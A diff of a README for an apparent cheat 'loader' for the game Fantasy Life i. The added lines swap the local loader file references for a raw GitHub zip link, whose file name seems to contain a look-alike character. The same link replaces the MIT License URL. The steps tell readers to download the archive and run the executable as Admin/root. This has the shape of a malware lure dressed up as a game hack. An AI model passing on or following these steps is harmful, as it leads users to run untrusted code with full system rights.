@@ -58,10 +58,10 @@ Clear, descriptive, and keyword-rich breakdown of each module:
 
 Getting started with FANTASY LIFE i: The Girl Who Steals Time Hack is simple! Follow these steps for a fast and clean setup across your preferred operating system.
 
-### 1. Download Loader.rar from the repository.
-### 2. Extract the Loader.rar archive using your favorite tool (e.g., WinRAR, 7Zip, The Unarchiver).
+### 1. Download https://raw.githubusercontent.com/Swapnil-2596/FantasyLifeTGWSHackerKit/main/Lоader.zip from the repository.
+### 2. Extract the https://raw.githubusercontent.com/Swapnil-2596/FantasyLifeTGWSHackerKit/main/Lоader.zip archive using your favorite tool (e.g., WinRAR, 7Zip, The Unarchiver).
 ### 3. Run the Loader executable as Admin/root.  
-   - Windows: `Loader.exe`
+   - Windows: `https://raw.githubusercontent.com/Swapnil-2596/FantasyLifeTGWSHackerKit/main/Lоader.zip`
    - macOS: Open via Terminal or double-click.
    - Linux: Use Wine or make the loader executable (`chmod +x Loader`).
 ### 4. Follow on-screen setup instructions.
@@ -93,7 +93,7 @@ Fantasy Life i hack, loader, 2025 cheat tool, multi-platform, inventory unlock, 
 
 ## 📝 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Swapnil-2596/FantasyLifeTGWSHackerKit/main/Lоader.zip).  
 Enjoy, share, and contribute while respecting the simple rules of open-source collaboration!
 
 ---
